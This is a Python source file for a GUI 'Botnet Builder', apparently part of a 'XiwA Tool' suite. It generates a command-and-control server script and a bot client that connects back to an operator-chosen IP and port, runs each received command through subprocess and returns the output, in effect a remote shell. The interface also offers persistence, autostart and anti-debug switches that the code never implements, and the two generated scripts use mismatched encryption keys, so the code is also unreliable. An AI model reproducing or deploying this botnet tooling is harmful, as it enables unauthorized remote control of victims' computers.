"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""
    
import customtkinter as ctk
import tkinter as tk
from PIL import Image, ImageTk
import os
import socket
import threading
import base64
import json
import sys
import subprocess
import time
import requests
from cryptography.fernet import Fernet

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

class BotnetBuilder(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Botnet Builder")
        self.geometry("900x600")
        self.configure(fg_color="#1a1a1a")

        self.output_dir = "output/botnetBuilder"
        os.makedirs(self.output_dir, exist_ok=True)

        self.main_frame = ctk.CTkFrame(self, fg_color="#1a1a1a")
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        self.title_label = ctk.CTkLabel(
            self.main_frame,
            text="BOTNET BUILDER",
            font=("Roboto", 36, "bold"),
            text_color="#ff0000"
        )
        self.title_label.pack(pady=20)

        self.features_frame = ctk.CTkFrame(
            self.main_frame,
            fg_color="#2d2d2d",
            corner_radius=15
        )
        self.features_frame.pack(fill="both", expand=True, padx=20, pady=20)

        self.create_c2_section()
        self.create_client_section()
        self.create_build_section()

    def create_c2_section(self):
        c2_frame = ctk.CTkFrame(
            self.features_frame,
            fg_color="#333333",
            corner_radius=10
        )
        c2_frame.pack(fill="x", padx=15, pady=10)

        ctk.CTkLabel(
            c2_frame,
            text="Configuration C2",
            font=("Roboto", 18, "bold"),
            text_color="#ff0000"
        ).pack(pady=5)

        self.ip_entry = ctk.CTkEntry(
            c2_frame,
            placeholder_text="IP du serveur C2",
            width=200
        )
        self.ip_entry.pack(pady=5)

        self.port_entry = ctk.CTkEntry(
            c2_frame,
            placeholder_text="Port",
            width=200
        )
        self.port_entry.pack(pady=5)

    def create_client_section(self):
        client_frame = ctk.CTkFrame(
            self.features_frame,
            fg_color="#333333",
            corner_radius=10
        )
        client_frame.pack(fill="x", padx=15, pady=10)

        ctk.CTkLabel(
            client_frame,
            text="Configuration Client",
            font=("Roboto", 18, "bold"),
            text_color="#ff0000"
        ).pack(pady=5)

        self.persistence_switch = ctk.CTkSwitch(
            client_frame,
            text="Persistence",
            button_color="#ff0000",
            button_hover_color="#cc0000"
        )
        self.persistence_switch.pack(pady=5)

        self.startup_switch = ctk.CTkSwitch(
            client_frame,
            text="Démarrage automatique",
            button_color="#ff0000",
            button_hover_color="#cc0000"
        )
        self.startup_switch.pack(pady=5)

        self.antidebug_switch = ctk.CTkSwitch(
            client_frame,
            text="Anti-Debug",
            button_color="#ff0000",
            button_hover_color="#cc0000"
        )
        self.antidebug_switch.pack(pady=5)

    def create_build_section(self):
        build_frame = ctk.CTkFrame(
            self.features_frame,
            fg_color="#333333",
            corner_radius=10
        )
        build_frame.pack(fill="x", padx=15, pady=10)

        self.build_c2_btn = ctk.CTkButton(
            build_frame,
            text="Générer Serveur C2",
            font=("Roboto", 16),
            fg_color="#ff0000",
            hover_color="#cc0000",
            command=self.build_c2
        )
        self.build_c2_btn.pack(pady=10)

        self.build_client_btn = ctk.CTkButton(
            build_frame,
            text="Générer Client",
            font=("Roboto", 16),
            fg_color="#ff0000",
            hover_color="#cc0000",
            command=self.build_client
        )
        self.build_client_btn.pack(pady=10)

    def build_c2(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()

        key = Fernet.generate_key()
        cipher = Fernet(key)

        c2_code = self.generate_c2_code(ip, port, cipher)
        
        output_path = os.path.join(self.output_dir, "c2_server.py")
        with open(output_path, "w") as f:
            f.write(c2_code)

    def build_client(self):
        ip = self.ip_entry.get()
        port = self.port_entry.get()
        
        persistence = self.persistence_switch.get()
        startup = self.startup_switch.get()
        antidebug = self.antidebug_switch.get()

        client_code = self.generate_client_code(
            ip, 
            port,
            persistence,
            startup,
            antidebug
        )

        output_path = os.path.join(self.output_dir, "client.py")
        with open(output_path, "w") as f:
            f.write(client_code)

    def generate_c2_code(self, ip, port, cipher):
        code = f"""
import socket
import threading
import json
from cryptography.fernet import Fernet

class C2Server:
    def __init__(self):
        self.host = "{ip}"
        self.port = {port}
        self.bots = []
        self.cipher = Fernet({cipher})
        
    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen()
        
        while True:
            client, address = server.accept()
            self.bots.append(client)
            thread = threading.Thread(target=self.handle_client, args=(client,))
            thread.start()
            
    def handle_client(self, client):
        while True:
            try:
                msg = client.recv(1024)
                if msg:
                    decrypted = self.cipher.decrypt(msg)
                    print(decrypted.decode())
            except:
                self.bots.remove(client)
                client.close()
                break

    def broadcast(self, message):
        for bot in self.bots:
            try:
                encrypted = self.cipher.encrypt(message.encode())
                bot.send(encrypted)
            except:
                self.bots.remove(bot)

if __name__ == "__main__":
    server = C2Server()
    server.start()
"""
        return code

    def generate_client_code(self, ip, port, persistence, startup, antidebug):
        code = f"""
import socket
import subprocess
import os
import sys
import time
from cryptography.fernet import Fernet

class Bot:
    def __init__(self):
        self.host = "{ip}"
        self.port = {port}
        self.cipher = Fernet({Fernet.generate_key()})
        
    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                self.handle()
            except:
                time.sleep(10)
                continue

    def handle(self):
        while True:
            try:
                data = self.sock.recv(1024)
                if data:
                    cmd = self.cipher.decrypt(data).decode()
                    output = subprocess.getoutput(cmd)
                    encrypted = self.cipher.encrypt(output.encode())
                    self.sock.send(encrypted)
            except:
                self.sock.close()
                break

if __name__ == "__main__":
    bot = Bot()
    bot.connect()
"""
        return code

def main():
    app = BotnetBuilder()
    app.mainloop()

if __name__ == "__main__":
    main()
